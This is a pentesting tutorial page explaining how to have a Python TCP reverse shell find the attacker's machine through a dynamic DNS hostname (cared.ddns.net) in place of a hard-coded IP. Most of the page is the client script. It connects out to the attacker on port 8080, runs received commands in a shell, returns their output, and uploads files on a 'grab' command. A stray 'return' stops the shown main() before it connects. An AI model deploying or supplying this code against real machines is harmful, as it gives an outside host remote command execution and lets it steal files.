---
title: Coding a DDNS aware shell
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - ddns
  - reverse shell
---

# Coding a DDNS aware shell

When coding a reverse shell you don't need to hardcode the IP address of the attacker machine. Instead, you can use a Dynamic DNS server such as https://www.noip.com/. To inform this server of our attacker IP public address we will install a linux dynamic client on our kali (an agent that will do the trick).

See [noip](../noip.md) to lear how to install a linux dynamic client on the attacker machine.

After installing the agent, let's see the modification needed on the client side of the [TCP reverse shell](coding-a-tcp-reverse-shell.md).


## Client side

```python

# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import socket
import subprocess
import os

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())
def connecting(ip):
    s = socket.socket()
    s.connect((ip, 8080))

    while True:
        command = s.recv(1024)

        if 'terminate' in command.decode():
            s.close()
            break

        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass
        else:
            CMD = subprocess.Popen(command.decode(), shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())
def main():
    ip = socket.gethostbyname('cared.ddns.net')
    print (ip)
    return
    connecting(ip)
main()

```
